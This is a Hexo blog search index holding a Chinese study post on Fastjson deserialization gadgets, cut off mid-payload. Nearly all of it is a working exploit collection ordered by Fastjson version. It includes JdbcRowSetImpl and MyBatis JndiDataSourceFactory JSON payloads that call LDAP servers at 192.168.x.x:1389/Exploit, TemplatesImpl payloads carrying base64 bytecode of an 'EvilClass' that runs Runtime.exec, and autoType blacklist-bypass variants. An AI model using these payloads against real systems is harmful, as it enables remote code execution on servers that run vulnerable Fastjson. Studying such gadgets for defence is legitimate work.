<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>fastjson gadgets学习</title>
    <link href="/2025/05/06/fastjson%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/05/06/fastjson%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h2><p>后面的版本修复主要是对前面版本的gadget加黑名单，寻找新gadget主要通过绕过黑名单来进行，一些已破解的黑名单白名单<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a></p><p>高版本的gadget使用条件比较苛刻，需要考量以下条件</p><ol><li>astjson版本</li><li>JDK版本</li><li>中间件版本</li><li>第三方依赖版本</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JdbcRowSetImpl</span><br>&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.196.128:1389/5ltgie&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br><br><br><span class="hljs-comment">//TemplatesImpl 不出网可用</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br><br> <br><br><span class="hljs-comment">// JndiDataSourceFactory 需要 mybatis依赖</span><br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>FastJson ≤ 1.2.24</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JdbcRowSetImpl</span><br>&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<br>    <span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.196.128:1389/5ltgie&quot;</span>,<br>    <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span><br>&#125;<br><br><span class="hljs-comment">//TemplatesImpl 不出网可用</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br><br><br><span class="hljs-comment">// JndiDataSourceFactory 需要 mybatis依赖</span><br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><p>1.2.25 ≤ FastJson ≤ 1.2.41</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JdbcRowSetImpl</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.196.128:1389/5ltgie&quot;</span>, <span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br><br><br><span class="hljs-comment">//TemplatesImpl 不出网可用</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;Lcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br><br> <br><span class="hljs-comment">// JndiDataSourceFactory 需要 mybatis依赖</span><br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;[org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>[&#123;,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br>&#123;  <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;LLorg.apache.ibatis.datasource.jndi.JndiDataSourceFactory;;&quot;</span>,  <span class="hljs-string">&quot;properties&quot;</span>: &#123;    <span class="hljs-string">&quot;data_source&quot;</span>: <span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>  &#125;&#125;<br><br><br><br></code></pre></td></tr></table></figure><p> FastJson ≤ 1.2.42</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//JdbcRowSetImpl</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,<span class="hljs-string">&quot;dataSourceName&quot;</span>:<span class="hljs-string">&quot;ldap://192.168.100.128:1389/Exploit&quot;</span>,<span class="hljs-string">&quot;autoCommit&quot;</span>:<span class="hljs-literal">true</span>&#125;<br><br><br><span class="hljs-comment">//TemplatesImpl 不出网可用</span><br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;[com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>[&#123;,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAIADAAAABYABQAAABkACQAcAAwAGgANABsAEQAeABMAAAAHAAJMBwAUBAABABUAAAACABY=&quot;</span>],<span class="hljs-string">&quot;_name&quot;</span>:<span class="hljs-string">&quot;EvilClass&quot;</span>,<span class="hljs-string">&quot;_tfactory&quot;</span>:&#123;&#125;,<span class="hljs-string">&quot;_outputProperties&quot;</span>:&#123;&#125;&#125;<br>&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;LLcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;;&quot;</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>:[<span class="hljs-string">&quot;yv66vgAAADQAJwoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACABAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEADkV2aWxDbGFzcy5qYXZhDAAJAAoHACEMACIAIwEACGNhbGMuZXhlDAAkACUBABNqYXZhL2lvL0lPRXhjZXB0aW9uDAAmAAoBABVvcmcvZXhhbXBsZS9FdmlsQ2xhc3MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAABAABAAkACgABAAsAAAAdAAEAAQAAAAUqtwABsQAAAAEADAAAAAYAAQAAAAsAAQANAA4AAgALAAAAGQAAAAMAAAABsQAAAAEADAAAAAYAAQAAABAADwAAAAQAAQAQAAEADQARAAIACwAAABkAAAAEAAAAAbEAAAABAAwAAAAGAAEAAAAVAA8AAAAEAAEAEAAIABIACgABAAsAAABPAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAA